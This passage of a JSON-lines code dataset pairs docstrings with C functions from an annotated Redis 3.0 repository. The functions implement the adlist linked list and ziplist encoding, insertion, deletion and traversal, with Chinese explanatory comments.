\u957f\u5ea6\u5927\u4e8e\u7b49\u4e8e16384\uff0c\u4e3a10\u7f16\u7801\u7c7b\u578b\n            len += 4;\n            if (!p) return len;\n            buf[0] = ZIP_STR_32B;\n            buf[1] = (rawlen >> 24) & 0xff;\n            buf[2] = (rawlen >> 16) & 0xff;\n            buf[3] = (rawlen >> 8) & 0xff;\n            buf[4] = rawlen & 0xff;\n        }\n    } else {\n        // \u5904\u7406\u6574\u5f62\u7f16\u7801\n        /* Implies integer encoding, so length is always 1. */\n        if (!p) return len;\n        buf[0] = encoding;\n    }\n\n    /* Store this length at p */\n    memcpy(p,buf,len);\n    return len;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Add a new node to the list, to tail, containing the specified 'value'\n * pointer as value.\n *\n * On error, NULL is returned and no operation is performed (i.e. the\n * list remains unaltered).\n * On success the 'list' pointer you pass to the function is returned. */\n// \u5728\u8868\u5c3e\u63d2\u5165\u4e00\u4e2a\u8282\u70b9\n", "func_signal": "list *listAddNodeTail(list *list, void *value)", "code": "{\n    // \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u5e76\u4e3a\u5176\u7533\u8bf7\u7a7a\u95f4\n    listNode *node;\n\n    if ((node = zmalloc(sizeof(*node))) == NULL)\n        return NULL;\n    // \u8bbe\u7f6e\u8282\u70b9\u7684\u6570\u636e\u57df\n    node->value = value;\n    // \u5f80\u94fe\u8868\u5c3e\u90e8\u63d2\u5165\u4e00\u4e2a\u65b0\u8282\u70b9\u9700\u8981\u8003\u8651\u94fe\u8868\u4e3a\u7a7a\u7684\u60c5\u51b5\n    if (list->len == 0) {\n        list->head = list->tail = node;\n        node->prev = node->next = NULL;\n    } else {\n        // \u94fe\u8868\u4e0d\u4e3a\u7a7a\u65f6\u7684\u63d2\u5165\u8fc7\u7a0b\uff0c\u4e3b\u8981\u662f\u6307\u9488\u64cd\u4f5c\uff0c\u6700\u540e\u65b0\u8282\u70b9\u6210\u4e3a\u5c3e\u8282\u70b9\n        node->prev = list->tail;\n        node->next = NULL;\n        list->tail->next = node;\n        list->tail = node;\n    }\n    // \u6700\u540e\u66f4\u65b0\u94fe\u8868\u957f\u5ea6\n    list->len++;\n    return list;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* \u5f80ziplist\u7684\u5934\u90e8\u6216\u5c3e\u90e8\u63d2\u5165\u4e00\u4e2a\u8282\u70b9\uff0c\u5e95\u5c42\u901a\u8fc7__ziplistInsert\u5b9e\u73b0\uff0c\u6709\u4e86\u4e0a\u9762\u7684\u5206\u6790\uff0c\u8be5\u51fd\u6570\u7684\u64cd\u4f5c\u5c31\u5f88\u7b80\u5355 */\n", "func_signal": "unsigned char *ziplistPush(unsigned char *zl, unsigned char *s, unsigned int slen, int where)", "code": "{\n    unsigned char *p;\n    p = (where == ZIPLIST_HEAD) ? ZIPLIST_ENTRY_HEAD(zl) : ZIPLIST_ENTRY_END(zl);\n    return __ziplistInsert(zl,p,s,slen);\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Return the total number of bytes used by the entry pointed to by 'p'. */\n/* \u8ba1\u7b97\u4e00\u4e2a\u8282\u70b9\u6240\u5360\u7528\u7684\u603b\u5b57\u8282\u6570 */\n", "func_signal": "static unsigned int zipRawEntryLength(unsigned char *p)", "code": "{\n    unsigned int prevlensize, encoding, lensize, len;\n    // \u6c42\u51fa\u5b58\u50a8\u4e0a\u4e00\u4e2a\u8282\u70b9\u957f\u5ea6\u503c\u6240\u5360\u7528\u7684\u5b57\u8282\u6570\n    ZIP_DECODE_PREVLENSIZE(p, prevlensize);\n    // \u6c42\u51fa\u5b58\u50a8\u5f53\u524d\u8282\u70b9\u957f\u5ea6\u6240\u5360\u7528\u7684\u5b57\u8282\u6570\u548c\u5f53\u524d\u8282\u70b9\u6570\u636e\u57df\u7684\u5b57\u8282\u6570\n    ZIP_DECODE_LENGTH(p + prevlensize, encoding, lensize, len);\n    return prevlensize + lensize + len;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Delete a range of entries from the ziplist. */\n/* \u5220\u9664\u8fde\u7eed\u7684\u4e00\u6279\u8282\u70b9\uff0c\u5176\u4e2dindex\u662f\u7b2c\u4e00\u4e2a\u5220\u9664\u7684\u8282\u70b9\u7d22\u5f15\uff0cnum\u662f\u5220\u9664\u7684\u8282\u70b9\u4e2a\u6570\u3002\n    \u8be5\u51fd\u6570\u5176\u5b9e\u5c31\u662fziplistIndex\u548c__ziplistDelete\u7684\u5c01\u88c5\n */\n", "func_signal": "unsigned char *ziplistDeleteRange(unsigned char *zl, unsigned int index, unsigned int num)", "code": "{\n    // \u627e\u5230\u7d22\u5f15\u4e3aindex\u7684\u8282\u70b9\n    unsigned char *p = ziplistIndex(zl,index);\n    // \u8c03\u7528__ziplistDelete\u8fdb\u884c\u5220\u9664\n    return (p == NULL) ? zl : __ziplistDelete(zl,p,num);\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* \u5220\u9664p\u6307\u9488\u6307\u5411\u7684\u8282\u70b9\uff0c\u64cd\u4f5c\u6210\u529f\u540ep\u6307\u5411\u88ab\u5220\u9664\u8282\u70b9\u4e0b\u4e00\u4e2a\u8282\u70b9 */\n", "func_signal": "unsigned char *ziplistDelete(unsigned char *zl, unsigned char **p)", "code": "{\n    // \u8bb0\u5f55p\u6307\u9488\u7684\u504f\u79fb\u91cf\n    size_t offset = *p-zl;\n    zl = __ziplistDelete(zl,*p,1);\n\n    /* Store pointer to current element in p, because ziplistDelete will\n     * do a realloc which might result in a different \"zl\"-pointer.\n     * When the delete direction is back to front, we might delete the last\n     * entry and end up with \"p\" pointing to ZIP_END, so check this. */\n    // \u91cd\u65b0\u83b7\u5f97p\u6307\u9488\uff0c\u6b64\u65f6p\u6307\u5411\u88ab\u5220\u9664\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\n    *p = zl+offset;\n    return zl;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "// \u5220\u9664\u4e00\u4e2a\u8282\u70b9\n", "func_signal": "void listDelNode(list *list, listNode *node)", "code": "{\n    // \u5220\u9664\u94fe\u8868\u4e2d\u7684\u4e00\u4e2a\u8282\u70b9\u8981\u8003\u8651\u88ab\u5220\u9664\u8282\u70b9\u662f\u5426\u4e3a\u5934\u7ed3\u70b9\u6216\u5c3e\u8282\u70b9\n\n    if (node->prev)\n        //  \u5982\u679cnode->prev\u5b58\u5728\uff0c\u8bf4\u660e\u8be5\u8282\u70b9\u4e0d\u662f\u5934\u7ed3\u70b9\uff0c\u76f4\u63a5\u5c06prev\u8282\u70b9\u7684next\u6307\u5411\u88ab\u5220\u9664\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\n        node->prev->next = node->next;\n    else\n        // \u88ab\u5220\u9664\u8282\u70b9\u662f\u5934\u7ed3\u70b9\uff0c\u8ba9\u88ab\u5220\u9664\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u6210\u4e3a\u5934\u7ed3\u70b9\n        list->head = node->next;\n\n    if (node->next)\n        // \u5982\u679cnode->next\u5b58\u5728\uff0c\u8bf4\u660e\u8be5\u8282\u70b9\u4e0d\u662f\u5c3e\u8282\u70b9\n        node->next->prev = node->prev;\n    else\n        // \u88ab\u5220\u9664\u8282\u70b9\u662f\u5c3e\u8282\u70b9\n        list->tail = node->prev;\n\n    // \u56de\u8c03free\u51fd\u6570\u5220\u9664\u8282\u70b9\u7684\u6570\u636e\u57df\n    if (list->free) list->free(node->value);\n    // \u91ca\u653e\u8282\u70b9\u7a7a\u95f4\n    zfree(node);\n    // \u6700\u540e\u66f4\u65b0\u94fe\u8868\u957f\u5ea6\n    list->len--;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* \u683c\u5f0f\u5316\u8f93\u51fa\uff0c\u6253\u5370\u51fa\u6574\u4e2aziplist\u7684\u4fe1\u606f */\n", "func_signal": "void ziplistRepr(unsigned char *zl)", "code": "{\n    unsigned char *p;\n    int index = 0;\n    zlentry entry;\n\n    printf(\n        \"{total bytes %d} \"\n        \"{length %u}\\n\"\n        \"{tail offset %u}\\n\",\n        intrev32ifbe(ZIPLIST_BYTES(zl)),\n        intrev16ifbe(ZIPLIST_LENGTH(zl)),\n        intrev32ifbe(ZIPLIST_TAIL_OFFSET(zl)));\n    p = ZIPLIST_ENTRY_HEAD(zl);\n    while(*p != ZIP_END) {\n        entry = zipEntry(p);\n        printf(\n            \"{\"\n                \"addr 0x%08lx, \"\n                \"index %2d, \"\n                \"offset %5ld, \"\n                \"rl: %5u, \"\n                \"hs %2u, \"\n                \"pl: %5u, \"\n                \"pls: %2u, \"\n                \"payload %5u\"\n            \"} \",\n            (long unsigned)p,\n            index,\n            (unsigned long) (p-zl),\n            entry.headersize+entry.len,\n            entry.headersize,\n            entry.prevrawlen,\n            entry.prevrawlensize,\n            entry.len);\n        p += entry.headersize;\n        if (ZIP_IS_STR(entry.encoding)) {\n            if (entry.len > 40) {\n                if (fwrite(p,40,1,stdout) == 0) perror(\"fwrite\");\n                printf(\"...\");\n            } else {\n                if (entry.len &&\n                    fwrite(p,entry.len,1,stdout) == 0) perror(\"fwrite\");\n            }\n        } else {\n            printf(\"%lld\", (long long) zipLoadInteger(p,entry.encoding));\n        }\n        printf(\"\\n\");\n        p += entry.len;\n        index++;\n    }\n    printf(\"{end}\\n\\n\");\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Add a new node to the list, to head, containing the specified 'value'\n * pointer as value.\n *\n * On error, NULL is returned and no operation is performed (i.e. the\n * list remains unaltered).\n * On success the 'list' pointer you pass to the function is returned. */\n// \u5728\u8868\u5934\u63d2\u5165\u4e00\u4e2a\u8282\u70b9\n", "func_signal": "list *listAddNodeHead(list *list, void *value)", "code": "{\n    // \u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u5e76\u4e3a\u5176\u7533\u8bf7\u7a7a\u95f4\n    listNode *node;\n\n    if ((node = zmalloc(sizeof(*node))) == NULL)\n        return NULL;\n    // \u8bbe\u7f6e\u8282\u70b9\u7684\u6570\u636e\u57df\n    node->value = value;\n    // \u5f80\u94fe\u8868\u5934\u90e8\u63d2\u5165\u4e00\u4e2a\u65b0\u8282\u70b9\u9700\u8981\u8003\u8651\u94fe\u8868\u4e3a\u7a7a\u7684\u60c5\u51b5\n    if (list->len == 0) {   // \u94fe\u8868\u4e3a\u7a7a\n        list->head = list->tail = node;\n        node->prev = node->next = NULL;\n    } else {\n        // \u94fe\u8868\u4e0d\u4e3a\u7a7a\u65f6\u7684\u63d2\u5165\u8fc7\u7a0b\uff0c\u4e3b\u8981\u662f\u6307\u9488\u64cd\u4f5c\uff0c\u6700\u540e\u65b0\u8282\u70b9\u6210\u4e3a\u5934\u7ed3\u70b9\u3002\n        node->prev = NULL;\n        node->next = list->head;\n        list->head->prev = node;\n        list->head = node;\n    }\n    // \u6700\u540e\u522b\u5fd8\u4e86\u66f4\u65b0\u94fe\u8868\u957f\u5ea6\n    list->len++;\n    return list;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* \u83b7\u53d6ziplist\u4e2dp\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9,\u5176\u5b9e\u5c31\u662f\u6307\u9488\u64cd\u4f5c */\n", "func_signal": "unsigned char *ziplistNext(unsigned char *zl, unsigned char *p)", "code": "{\n    ((void) zl);\n\n    /* \"p\" could be equal to ZIP_END, caused by ziplistDelete,\n     * and we should return NULL. Otherwise, we should return NULL\n     * when the *next* element is ZIP_END (there is no next entry). */\n    if (p[0] == ZIP_END) {\n        return NULL;\n    }\n\n    p += zipRawEntryLength(p);\n    // \u6ce8\u610f\u8fd9\u91cc\u9700\u8981\u4e24\u6b21\u5224\u65adp[0] == ZIP_END\n    if (p[0] == ZIP_END) {\n        return NULL;\n    }\n\n    return p;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Create an iterator in the list private iterator structure */\n// \u91cd\u7f6e\u8fed\u4ee3\u5668\u4e3a\u94fe\u8868\u5934\u7ed3\u70b9\n", "func_signal": "void listRewind(list *list, listIter *li)", "code": "{\n    li->next = list->head;\n    li->direction = AL_START_HEAD;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Check if string pointed to by 'entry' can be encoded as an integer.\n * Stores the integer value in 'v' and its encoding in 'encoding'. */\n/* \u5224\u65adentry\u6307\u5411\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u7f16\u7801\u4e3a\u4e00\u4e2a\u6574\u578b\u6570\u636e\uff0c\u5e76\u628a\u8be5\u6570\u503c\u5b58\u653e\u5728v\u4e2d\uff0c\u628a\u5176\u7f16\u7801\u65b9\u5f0f\u5b58\u653e\u5728encoding\u4e2d */\n", "func_signal": "static int zipTryEncoding(unsigned char *entry, unsigned int entrylen, long long *v, unsigned char *encoding)", "code": "{\n    long long value;\n\n    if (entrylen >= 32 || entrylen == 0) return 0;\n    /* string2ll\u5b9a\u4e49\u5728util.h\u4e2d\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u4e00\u4e2along long\u7c7b\u578b\u6574\u6570\u503c\u3002\u5982\u679c\u6210\u529f\u8fd4\u56de1\uff0c\u5931\u8d25\u8fd4\u56de0 */\n    if (string2ll((char*)entry,entrylen,&value)) {\n        /* Great, the string can be encoded. Check what's the smallest\n         * of our encoding types that can hold this value. */\n        // \u4e0b\u9762\u7684\u64cd\u4f5c\u6839\u636e\u6574\u578b\u503c\u786e\u5b9a\u7f16\u7801\u65b9\u5f0f\n        if (value >= 0 && value <= 12) {\n            *encoding = ZIP_INT_IMM_MIN+value;\n        } else if (value >= INT8_MIN && value <= INT8_MAX) {\n            *encoding = ZIP_INT_8B;\n        } else if (value >= INT16_MIN && value <= INT16_MAX) {\n            *encoding = ZIP_INT_16B;\n        } else if (value >= INT24_MIN && value <= INT24_MAX) {\n            *encoding = ZIP_INT_24B;\n        } else if (value >= INT32_MIN && value <= INT32_MAX) {\n            *encoding = ZIP_INT_32B;\n        } else {\n            *encoding = ZIP_INT_64B;\n        }\n        *v = value;\n        return 1;\n    }\n    return 0;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Return pointer to previous entry in ziplist. */\n/* \u83b7\u53d6ziplist\u4e2dp\u8282\u70b9\u7684\u524d\u4e00\u4e2a\u8282\u70b9 */\n", "func_signal": "unsigned char *ziplistPrev(unsigned char *zl, unsigned char *p)", "code": "{\n    unsigned int prevlensize, prevlen = 0;\n\n    /* Iterating backwards from ZIP_END should return the tail. When \"p\" is\n     * equal to the first element of the list, we're already at the head,\n     * and should return NULL. */\n    if (p[0] == ZIP_END) {\n        // \u5982\u679c\u6307\u9488p\u6307\u5411ziplist\u7684\u7ed3\u675f\u7b26\uff0c\u5219\u524d\u4e00\u4e2a\u8282\u70b9\u5c31\u662f\u5c3e\u8282\u70b9\uff0c\u901a\u8fc7ZIPLIST_ENTRY_TAIL\u76f4\u63a5\u83b7\u53d6\n        p = ZIPLIST_ENTRY_TAIL(zl);\n        return (p[0] == ZIP_END) ? NULL : p;\n    } else if (p == ZIPLIST_ENTRY_HEAD(zl)) {\n        // \u5982\u679c\u5f53\u524d\u8282\u70b9\u662fziplist\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u5219\u524d\u4e00\u4e2a\u8282\u70b9\u4e3aNULL\n        return NULL;\n    } else {\n        // \u83b7\u53d6\u524d\u4e00\u4e2a\u8282\u70b9\u7684\u957f\u5ea6\n        ZIP_DECODE_PREVLEN(p, prevlensize, prevlen);\n        assert(prevlen > 0);\n        // \u627e\u5230\u524d\u4e00\u4e2a\u8282\u70b9\u7684\u9996\u5730\u5740\n        return p-prevlen;\n    }\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Return bytes needed to store integer encoded by 'encoding' */\n/* \u8fd4\u56de\u6307\u5b9a\u6574\u578b\u7f16\u7801\u65b9\u5f0f\u6240\u5360\u7528\u7684\u5b57\u8282\u957f\u5ea6 */\n", "func_signal": "static unsigned int zipIntSize(unsigned char encoding)", "code": "{\n    switch(encoding) {\n    case ZIP_INT_8B:  return 1; // 1byte\n    case ZIP_INT_16B: return 2; // 2bytes\n    case ZIP_INT_24B: return 3; // 3bytes\n    case ZIP_INT_32B: return 4; // 4bytes\n    case ZIP_INT_64B: return 8; // 8bytes\n    default: return 0; /* 4 bit immediate */\n    }\n    assert(NULL);\n    return 0;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/*\n    \u7ea7\u8054\u66f4\u65b0ziplist\n\n    \u5f53\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\u63d2\u5165\u94fe\u8868\u65f6\uff0c\u5982\u679c\u539f\u8282\u70b9\u7684prevlen\u4e0d\u8db3\u4ee5\u4fdd\u5b58\u65b0\u8282\u70b9\u7684\u957f\u5ea6\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u5bf9\u539f\u8282\u70b9\u5f97\u7a7a\u95f4\u8fdb\u884c\u6269\u5c55\uff0c\n    \u4e5f\u5c31\u662f\u4ece1\u4e2a\u5b57\u8282\u6269\u5c55\u52305\u4e2a\u5b57\u8282\u3002\u7279\u522b\u662f\u8fd9\u79cd\u6269\u5c55\u64cd\u4f5c\u53c8\u53ef\u80fd\u5bfc\u81f4\u4e0b\u4e00\u4e2a\u8282\u70b9\u9700\u8981\u6269\u5c55......\u8fd9\u79cd\u60c5\u51b5\u5728\u591a\u4e2a\u8fde\u7eed\u8282\u70b9\n    \u7684\u957f\u5ea6\u90fd\u63a5\u8fd1254\uff08\u4e0a\u4e00\u8282\u70b9\u957f\u5ea6\u5c0f\u4e8e254\u53ea\u89811\u4e2a\u5b57\u8282\u4fdd\u5b58\u5373\u53ef\uff09\u7684\u65f6\u5019\u5f88\u53ef\u80fd\u53d1\u751f\u3002\n\n    __ziplistCascadeUpdate\u5c31\u662f\u7528\u6765\u5904\u7406\u8fd9\u79cd\u7ea7\u8054\u6269\u5c55\u64cd\u4f5c\n\n    \u53e6\u5916\uff0c\u8fd8\u53ef\u80fd\u51fa\u73b0\u76f8\u53cd\u7684\u60c5\u51b5\uff1a\u56e0\u4e3a\u63d2\u5165\u8282\u70b9\u7684\u957f\u5ea6\u6bd4\u8f83\u5c0f\u800c\u5f15\u8d77\u8fde\u7eed\u7684\u7f29\u5c0f\u64cd\u4f5c\u3002\u4f46\u662f\uff0c\u4e3a\u4e86\u907f\u514d\u51fa\u73b0\u201c\u6269\u5c55-\u7f29\u5c0f-\u6269\u5c55-\u7f29\u5c0f\u201d\n    \u8fd9\u79cd\u201c\u6296\u52a8\u201d\u60c5\u51b5\u53cd\u590d\u51fa\u73b0\uff0credis\u5bf9\u8fd9\u79cd\u56e0\u63d2\u5165\u8282\u70b9\u7684\u957f\u5ea6\u8f83\u5c0f\u800c\u5f15\u8d77\u7684\u7f29\u5c0f\u64cd\u4f5c\u91c7\u53d6\u201c\u4e0d\u5904\u7406\u201d\u7684\u7b56\u7565\uff0c\u4e5f\u5c31\u662f\u4efb\u7531prevlen\u6bd4\n    \u6240\u9700\u7684\u957f\u5ea6\u957f\n    \n    \u8be5\u51fd\u6570\u8fd4\u56de\u66f4\u65b0\u540e\u7684ziplist\uff0c\u53c2\u6570p\u6307\u5411\u9700\u8981\u6269\u5c55prevlensize\u7684\u8282\u70b9\u9996\u5730\u5740\n */\n", "func_signal": "static unsigned char *__ziplistCascadeUpdate(unsigned char *zl, unsigned char *p)", "code": "{\n    size_t curlen = intrev32ifbe(ZIPLIST_BYTES(zl)), rawlen, rawlensize;\n    size_t offset, noffset, extra;\n    unsigned char *np;\n    zlentry cur, next;\n\n    // \u4ecep\u6307\u5411\u7684\u8282\u70b9\u5f00\u59cb\u904d\u5386\u5230ziplist\u5217\u8868\u5c3e\u90e8\n    while (p[0] != ZIP_END) {\n        // \u53d6\u5f97\u5f53\u524d\u8282\u70b9\n        cur = zipEntry(p);\n        // \u5f53\u524d\u8282\u70b9\u7684\u5360\u7528\u7684\u5b57\u8282\u6570\n        rawlen = cur.headersize + cur.len;\n        // \u5b58\u50a8rawlen\u6240\u9700\u8981\u7684\u5b57\u8282\u6570\n        rawlensize = zipPrevEncodeLength(NULL,rawlen);\n\n        /* Abort if there is no next entry. */\n        // \u5982\u679c\u5230\u8fbe\u8868\u5c3e\uff0c\u76f4\u63a5\u9000\u51fa\n        if (p[rawlen] == ZIP_END) break;\n        // \u83b7\u5f97\u4e0b\u4e00\u4e2a\u8282\u70b9\n        next = zipEntry(p+rawlen);\n\n        /* Abort when \"prevlen\" has not changed. */\n        // \u5982\u679c\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684prevlen\u7b49\u4e8e\u5f53\u524d\u8282\u70b9\u7684rawlen\uff0c\u5219\u6b64\u540e\u7684\u8282\u70b9\u90fd\u65e0\u9700\u8c03\u6574\uff0c\u76f4\u63a5\u9000\u51fa\n        if (next.prevrawlen == rawlen) break;\n\n        // \u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u957f\u5ea6\u7a7a\u95f4\u4e0d\u8db3\uff0c\u9700\u8981\u8fdb\u884c\u6269\u5c55\u64cd\u4f5c\n        if (next.prevrawlensize < rawlensize) {\n            /* The \"prevlen\" field of \"next\" needs more bytes to hold\n             * the raw length of \"cur\". */\n            // \u4e0b\u9762\u7684ziplistResize\u53d1\u751f\u4e86\u7a7a\u95f4\u7684\u91cd\u65b0\u5206\u914d\uff0c\u6240\u4ee5\u9700\u8981\u8bb0\u5f55p\u5bf9\u4e8ezl\u7684\u504f\u79fb\u91cf\n            offset = p-zl;\n            // \u6c42\u51fa\u9700\u8981\u6269\u5c55\u7684\u5b57\u8282\u6570\n            extra = rawlensize-next.prevrawlensize;\n            zl = ziplistResize(zl,curlen+extra);\n            // ziplistResize\u53d1\u751f\u4e86\u7a7a\u95f4\u7684\u91cd\u65b0\u5206\u914d\uff0c\u8fd9\u91cc\u91cd\u65b0\u83b7\u53d6p\u6307\u9488\n            p = zl+offset;\n\n            /* Current pointer and offset for next element. */\n            // \u65b0\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u9996\u5730\u5740\n            np = p+rawlen;\n            noffset = np-zl;\n\n            /* Update tail offset when next element is not the tail element. */\n            // zl+intrev32ifbe(ZIPLIST_TAIL_OFFSET(zl))\u4e3a\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u9996\u5730\u5740\n            // \u5982\u679c\u4e0b\u4e00\u4e2a\u8282\u70b9\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff0c\u53d1\u751f\u6269\u5c55\u64cd\u4f5c\u9700\u8981\u66f4\u65b0\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u504f\u79fb\u91cf\n            if ((zl+intrev32ifbe(ZIPLIST_TAIL_OFFSET(zl))) != np) {\n                ZIPLIST_TAIL_OFFSET(zl) =\n                    intrev32ifbe(intrev32ifbe(ZIPLIST_TAIL_OFFSET(zl))+extra);\n            }\n\n            /* Move the tail to the back. */\n            // \u8fd9\u91cc\u5c06\u539f\u8282\u70b9\u7684\u4e0b\u4e00\u4e2a\u8282\u70b9\u7684\u6570\u636e\u533a\u57df\u5230ziplist\u5c3e\u90e8\u7684\u5168\u90e8\u6570\u636e\u5411\u540e\u504f\u79fb\uff0c\u7a7a\u4f59\u51farawlensize\u4e2a\u5b57\u8282\n            // \u7528\u6765\u5b58\u653e\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684\u957f\u5ea6\n            memmove(np+rawlensize,  \n                np+next.prevrawlensize,\n                curlen-noffset-next.prevrawlensize-1);\n            // \u7a7a\u4f59\u51fa\u6765\u7684rawlensize\u4e2a\u5b57\u8282\u7528\u6765\u5b58\u50a8\u4e0a\u4e00\u4e2a\u8282\u70b9\u7684\u957f\u5ea6\n            zipPrevEncodeLength(np,rawlen);\n\n            /* Advance the cursor */\n            // \u6307\u5411\u4e0b\u4e00\u4e2a\u8282\u70b9\n            p += rawlen;\n            // \u66f4\u65b0\u5f53\u524d\u8282\u70b9\u7684\u957f\u5ea6\n            curlen += extra;    \n        } else {\n            // \u5982\u679c\u4e0b\u4e00\u8282\u70b9\u7684\u957f\u5ea6\u7a7a\u95f4\u6709\u5197\u4f59\uff0c\u5219\u4e0d\u8fdb\u884c\u538b\u7f29\u4ee5\u9632\u6b62\u201c\u6296\u52a8\u201d\u73b0\u8c61\u3002\n            if (next.prevrawlensize > rawlensize) {\n                /* This would result in shrinking, which we want to avoid.\n                 * So, set \"rawlen\" in the available bytes. */\n                zipPrevEncodeLengthForceLarge(p+rawlen,rawlen);\n            } else {\n                zipPrevEncodeLength(p+rawlen,rawlen);\n            }\n\n            /* Stop here, as the raw length of \"next\" has not changed. */\n            break;\n        }\n    }\n    return zl;\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Encode the length of the previous entry and write it to \"p\". This only\n * uses the larger encoding (required in __ziplistCascadeUpdate). */\n/* \u8be5\u51fd\u6570\u4e0ezipPrevEncodeLength\u529f\u80fd\u76f8\u4f3c\uff0c\u53ea\u4e0d\u8fc7\u5b83\u53ea\u5904\u7406len >= 254\u7684\u60c5\u5f62 */\n", "func_signal": "static void zipPrevEncodeLengthForceLarge(unsigned char *p, unsigned int len)", "code": "{\n    if (p == NULL) return;\n    p[0] = ZIP_BIGLEN;\n    memcpy(p+1,&len,sizeof(len));\n    memrev32ifbe(p+1);\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "// \u91cd\u7f6e\u8fed\u4ee3\u5668\u4e3a\u94fe\u8868\u5c3e\u7ed3\u70b9\n", "func_signal": "void listRewindTail(list *list, listIter *li)", "code": "{\n    li->next = list->tail;\n    li->direction = AL_START_TAIL;\n}", "path": "adlist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
{"docstring": "/* Store integer 'value' at 'p', encoded as 'encoding' */\n/* \u5c06\u7ed9\u5b9a\u6574\u6570\u5b58\u5165\u6307\u9488p\u6307\u5411\u7684\u7f13\u51b2\u533a\u4e2d\uff0c\u4e0d\u540c\u5927\u5c0f\u8303\u56f4\u7684\u6574\u6570\u91c7\u53d6\u4e0d\u540c\u957f\u5ea6\u5b58\u50a8\u7684\u65b9\u5f0f\u6765\u6781\u5927\u51cf\u5c0f\u4e86\u5c0f\u6570\u7684\u7a7a\u95f4\u4f7f\u7528\uff0c\u8fd9\u91cc\u7684encoding\u5c31\u786e\u5b9a\u4e86\u6574\u6570\u8303\u56f4\u3002 */\n", "func_signal": "static void zipSaveInteger(unsigned char *p, int64_t value, unsigned char encoding)", "code": "{\n    int16_t i16;\n    int32_t i32;\n    int64_t i64;\n    /* \u4e0b\u9762memrev16ifbe\u3001memrev32ifbe\u3001memrev64ifbe\u51fd\u6570\u5b9a\u4e49\u5728endianconv.h\u4e2d\uff0c\u5c06\u5927\u7aef\u6a21\u5f0f\u7684\u6570\u8f6c\u5316\u4e3a\u5c0f\u7aef\u6a21\u5f0f */\n    if (encoding == ZIP_INT_8B) {\n        ((int8_t*)p)[0] = (int8_t)value;\n    } else if (encoding == ZIP_INT_16B) {\n        i16 = value;\n        memcpy(p,&i16,sizeof(i16));\n        memrev16ifbe(p);\n    } else if (encoding == ZIP_INT_24B) {\n        i32 = value<<8;\n        memrev32ifbe(&i32);\n        memcpy(p,((uint8_t*)&i32)+1,sizeof(i32)-sizeof(uint8_t));\n    } else if (encoding == ZIP_INT_32B) {\n        i32 = value;\n        memcpy(p,&i32,sizeof(i32));\n        memrev32ifbe(p);\n    } else if (encoding == ZIP_INT_64B) {\n        i64 = value;\n        memcpy(p,&i64,sizeof(i64));\n        memrev64ifbe(p);\n    } else if (encoding >= ZIP_INT_IMM_MIN && encoding <= ZIP_INT_IMM_MAX) {\n        /* Nothing to do, the value is stored in the encoding itself. */\n    } else {\n        assert(NULL);\n    }\n}", "path": "ziplist.c", "repo_name": "xiejingfa/the-annotated-redis-3.0", "stars": 92, "license": "None", "language": "c", "size": 263}
